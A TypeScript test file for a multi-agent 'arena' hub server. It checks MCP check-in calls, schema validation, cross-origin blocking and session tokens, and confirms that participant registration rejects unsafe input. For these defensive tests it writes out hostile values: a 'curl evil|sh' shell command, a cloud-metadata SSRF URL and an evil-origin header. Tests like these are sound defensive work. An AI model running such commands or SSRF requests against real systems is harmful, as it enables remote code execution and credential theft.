import { mkdtempSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { createHubApp } from "@factory-arena/hub-server";
import addFormats from "ajv-formats";
import Ajv2020 from "ajv/dist/2020.js";
import { describe, expect, it } from "vitest";
import YAML from "yaml";

const REPO_ROOT = resolve(import.meta.dirname, "../..");
const CONTRACTS_DIR = join(REPO_ROOT, "specs/001-multi-agent-arena/contracts");

describe("US1 Contract Tests: MCP Checkin/Activity, REST Participants & A2A AgentCard (T013)", () => {
  it("validates /.well-known/agent.json against a2a-agent-card.schema.json and verifies OpenAPI & MCP schemas", async () => {
    const dir = mkdtempSync(join(tmpdir(), "arena-us1-contract-"));
    const hub = createHubApp({ stateDir: dir, hubBaseUrl: "http://127.0.0.1:4747" });

    try {
      const ajv = new Ajv2020({ strict: false, allErrors: true });
      addFormats(ajv);

      const agentCardSchema = JSON.parse(
        readFileSync(join(CONTRACTS_DIR, "a2a-agent-card.schema.json"), "utf8"),
      );
      const validateCard = ajv.compile(agentCardSchema);

      const cardRes = await hub.app.request("/.well-known/agent.json");
      expect(cardRes.status).toBe(200);
      const cardJson = await cardRes.json();
      expect(validateCard(cardJson)).toBe(true);

      const oas = YAML.parse(
        readFileSync(join(CONTRACTS_DIR, "arena-http-api.openapi.yaml"), "utf8"),
      );
      expect(oas.paths["/api/v1/participants"]).toBeDefined();
      expect(oas.paths["/api/v1/permissions/{permissionId}/resolve"]).toBeDefined();

      const mcpRes = await hub.app.request("/mcp", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 1,
          method: "tools/call",
          params: {
            name: "arena_checkin_desk",
            arguments: {
              session_fingerprint: "mcp_bridge:/repo:VSC-01",
              employee_code: "VSC-01",
              display_name: "VSCode Window 1",
              department: "frontend",
              job_title: "UI Developer",
            },
          },
        }),
      });
      expect(mcpRes.status).toBe(200);
      const mcpJson = await mcpRes.json();
      const emp = mcpJson.result.structuredContent;
      expect(emp.employee_code).toBe("VSC-01");
      expect(emp.desk_slot_id).toMatch(/^DESK-FE-/);

      const actRes = await hub.app.request("/mcp", {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({
          jsonrpc: "2.0",
          id: 2,
          method: "tools/call",
          params: {
            name: "arena_report_desk_activity",
            arguments: {
              employee_id: emp.id,
              avatar_pose: "typing_code",
              context_fill_pct: 33,
              permission_prompt: "Allow running playwright install?",
            },
          },
        }),
      });
      expect(actRes.status).toBe(200);
      const actJson = await actRes.json();
      expect(actJson.result.structuredContent.employee.avatar_pose).toBe("hand_raised");
      expect(actJson.result.structuredContent.permissionRequest.status).toBe("pending");
    } finally {
      hub.core.close();
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("blocks cross-origin requests (403), enforces LocalSessionToken (401), and persists SSRF-checked A2A/CLI configs", async () => {
    const dir = mkdtempSync(join(tmpdir(), "arena-us1-sec-"));
    const hub = createHubApp({
      stateDir: dir,
      hubBaseUrl: "http://127.0.0.1:4747",
      apiToken: "local-secret-session-token",
    });

    try {
      const evilOriginRes = await hub.app.request("/api/v1/participants", {
        headers: {
          Origin: "https://evil.example",
          "X-Arena-Session-Token": "local-secret-session-token",
        },
      });
      expect(evilOriginRes.status).toBe(403);
      expect(evilOriginRes.headers.get("access-control-allow-origin")).toBeNull();

      const missingTokenRes = await hub.app.request("/api/v1/participants", {
        headers: { Origin: "http://127.0.0.1:4747" },
      });
      expect(missingTokenRes.status).toBe(401);

      const authedRes = await hub.app.request("/api/v1/participants", {
        headers: {
          Origin: "http://127.0.0.1:4747",
          "X-Arena-Session-Token": "local-secret-session-token",
        },
      });
      expect(authedRes.status).toBe(200);
      expect(authedRes.headers.get("access-control-allow-origin")).toBe("http://127.0.0.1:4747");

      // SSRF guard must reject cloud metadata remote_agent_card_url on registration
      const ssrfRes = await hub.app.request("/api/v1/participants", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "X-Arena-Session-Token": "local-secret-session-token",
        },
        body: JSON.stringify({
          employee_code: "A2A-SSRF",
          display_name: "Unsafe Remote Agent",
          department: "security_qa",
          job_title: "Remote Agent",
          transport_type: "a2a_remote",
          remote_agent_card_url: "http://169.254.169.254/latest/meta-data",
        }),
      });
      expect(ssrfRes.status).toBe(500);

      // Valid public HTTPS A2A URL and CLI command must persist across SQLite
      const a2aRes = await hub.app.request("/api/v1/participants", {
        method: "POST",
        headers: {
          "content-type": "application/json",
          "X-Arena-Session-Token": "local-secret-session-token",
        },
        body: JSON.stringify({
          employee_code: "A2A-OK-01",
          display_name: "Safe Remote Agent",
          department: "architecture",
          job_title: "Remote Architect",
          transport_type: "a2a_remote",
          remote_agent_card_url: "https://agents.example.com/a2a",
        }),
      });
      expect(a2aRes.status).toBe(201);
      const a2aEmp = await a2aRes.json();
      expect(a2aEmp.agent_card?.url).toBe("https://agents.example.com/a2a");

      const registerCli = (employeeCode: string, cliCommand: string[], fingerprint?: string) =>
        hub.app.request("/api/v1/participants", {
          method: "POST",
          headers: {
            "content-type": "application/json",
            "X-Arena-Session-Token": "local-secret-session-token",
          },
          body: JSON.stringify({
            employee_code: employeeCode,
            display_name: "Custom CLI Worker",
            department: "devops",
            job_title: "CLI Runner",
            transport_type: "cli_pty",
            cli_command: cliCommand,
            ...(fingerprint ? { session_fingerprint: fingerprint } : {}),
          }),
        });

      // Allowlisted coding-agent CLI persists across SQLite
      const allowedCommand = ["claude", "--output-format", "stream-json"];
      const cliRes = await registerCli("CLI-OK-01", allowedCommand, "cli_pty:local:CLI-OK-01");
      expect(cliRes.status).toBe(201);
      const cliEmp = await cliRes.json();
      expect(cliEmp.cli_command).toEqual(allowedCommand);

      // Shells, inline interpreter code and unlisted binaries are refused (no RCE via the API)
      expect((await registerCli("CLI-BAD-01", ["sh", "-c", "curl evil|sh"])).status).toBe(403);
      expect(
        (await registerCli("CLI-BAD-02", [process.execPath, "-e", "process.exit(0)"])).status,
      ).toBe(403);
      expect((await registerCli("CLI-BAD-03", ["/tmp/evil/claude"])).status).toBe(403);

      // Re-registering a known fingerprint cannot swap the process it runs
      const swapRes = await registerCli("CLI-OK-01", ["codex"], "cli_pty:local:CLI-OK-01");
      expect(swapRes.status).toBe(409);
    } finally {
      hub.core.close();
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
